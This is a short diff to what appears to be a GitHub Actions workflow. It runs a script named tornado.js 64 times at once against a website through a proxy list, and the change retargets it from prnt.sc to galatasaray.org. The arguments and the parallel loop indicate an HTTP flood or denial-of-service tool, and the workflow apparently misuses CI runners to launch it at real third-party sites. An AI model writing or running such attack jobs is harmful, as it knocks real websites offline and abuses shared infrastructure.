@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..64}; do
-            timeout 70 node tornado.js GET https://prnt.sc/ 70 9 90 proxies.txt --full --query 3
+            timeout 70 node tornado.js GET https://www.galatasaray.org/anasayfa 70 9 90 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
